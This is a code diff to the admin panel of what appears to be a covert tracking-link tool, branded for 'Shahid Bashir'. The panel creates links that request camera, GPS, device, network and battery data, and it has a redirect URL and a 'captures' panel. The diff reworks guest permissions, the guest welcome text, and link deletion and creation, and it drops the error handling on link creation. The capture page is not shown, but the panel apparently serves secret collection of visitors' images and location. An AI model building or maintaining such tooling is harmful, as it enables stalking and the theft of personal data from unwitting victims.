@@ -258,8 +258,6 @@
 
         /* Hide delete buttons when guest has no delete permission */
         body.no-delete .no-delete-hide { display: none !important; }
-        /* Hide admin-only action buttons from guests (rename/delete/toggle shown but restricted) */
-        body.guest-view [data-action="delete"] { display: none; }
 
         /* ══════════════════════════════════════════════════════════
            TABLE
@@ -704,7 +702,7 @@
     <div class="modal-box">
         <div class="gw-avatar">👤</div>
         <h3 id="guestWelcomeName">Welcome!</h3>
-        <p class="gw-sub">You are logged in as a <strong>Guest</strong>.<br>Your access is limited and all activity is monitored.</p>
+        <p class="gw-sub">You have <strong>limited access</strong> to this panel.<br>For full access, please contact the admin — <strong>Shahid Bashir</strong>.</p>
         <div class="creator-branding">
             <div class="cb-title">Powered &amp; Created By</div>
             <div class="cb-name">Shahid Bashir</div>
@@ -1379,8 +1377,8 @@ function setupGuestUI(){
 }
 
 function applyGuestPermissions(perms){
-    // Hide Links nav item only if guest can't view OR manage links
-    if(!perms.view_links && !perms.manage_links){
+    // Hide nav items guest can't access
+    if(!perms.view_links){
         const el=document.querySelector('[data-panel="links"]');
         if(el) el.style.display='none';
     }
@@ -1389,19 +1387,19 @@ function applyGuestPermissions(perms){
         if(el) el.style.display='none';
     }
     if(!perms.manage_links){
-        // Hide only the create-link form, NOT the links table
+        // hide create link form
         const el=document.querySelector('#panel-links .section:first-child');
         if(el) el.style.display='none';
     }
     if(!perms.delete_data){
+        // hide delete buttons — done via CSS class
         document.body.classList.add('no-delete');
     }
+    // Restrict captures panel
     if(!perms.view_captures){
         const el=document.querySelector('[data-panel="captures"]');
         if(el) el.style.display='none';
     }
-    // Hide admin-only columns from links table for guests
-    document.body.classList.add('guest-view');
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -1668,12 +1666,19 @@ document.getElementById('linkTableBody').addEventListener('click',e=>{
         populateEditLinkPerms(l.permissions||{});
         document.getElementById('editLinkModal').classList.add('open');
     } else if(action==='delete'){
-        if(!confirm('Move this link to Recycle Bin?')) return;
+        if(!confirm('Delete this link?')) return;
         const l=allLinksData?.[id];
-        if(l) addToBin({...l,_type:'link',firebaseId:id});
-        remove(ref(db,'managed_links/'+id));
-        updateStats(); renderBin();
-        toast('🗑️ Link moved to Recycle Bin','var(--yellow)');
+        // Try Firebase remove first, then update local state
+        remove(ref(db,'managed_links/'+id))
+            .then(()=>{
+                if(l) addToBin({...l,_type:'link',firebaseId:id});
+                updateStats(); renderBin();
+                toast('🗑️ Link deleted','var(--yellow)');
+            })
+            .catch(err=>{
+                console.error('Delete failed:',err);
+                toast('❌ Delete failed: '+err.message,'var(--red)');
+            });
     }
 });
 
@@ -1688,16 +1693,10 @@ document.getElementById('createBtn').onclick=()=>{
         id,name,active:true,visits:0,cam,gps,
         redirectUrl:ru||'',createdAt:Date.now(),
         permissions:{camera:cam,location:gps,device_info:true,network_info:true,battery_info:true}
-    }).then(()=>{
-        document.getElementById('linkName').value='';
-        document.getElementById('linkRedirect').value='';
-        toast('✅ Link created: '+name,'var(--green)');
-        // FIX: navigate to links panel so guest sees the new link in the table
-        const linksNav = document.querySelector('[data-panel="links"]');
-        if(linksNav) linksNav.click();
-    }).catch(err=>{
-        toast('❌ Failed to create link: '+err.message,'var(--red)');
     });
+    document.getElementById('linkName').value='';
+    document.getElementById('linkRedirect').value='';
+    toast('✅ Link created: '+name,'var(--green)');
 };
 
 function getEditLinkPerms(){
